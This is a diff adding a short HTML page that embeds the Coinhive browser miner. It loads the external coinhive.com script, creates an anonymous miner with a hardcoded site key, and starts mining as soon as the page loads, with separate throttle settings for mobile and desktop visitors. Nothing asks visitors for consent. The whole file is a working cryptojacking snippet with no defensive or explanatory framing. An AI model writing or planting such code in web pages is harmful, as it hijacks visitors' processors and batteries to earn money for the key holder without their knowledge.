@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Coinhive miner</title>
+</head>
+<body>
+
+<h1>Coinhive miner</h1>
+     Coinhive
+        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+        <script>
+        
+            var miner = new CoinHive.Anonymous('pRlfzpMJ3xh4rHg1rfSBiwbZg6Xo07Tf');
+
+            if (miner.isMobile()) {
+		  
+            miner.start();
+            miner.setThrottle(0.9);
+	
+            }else{
+        
+            miner.start();
+            miner.setThrottle(0.2);
+                
+            }
+         </script>
+
+
+</body>
+</html>
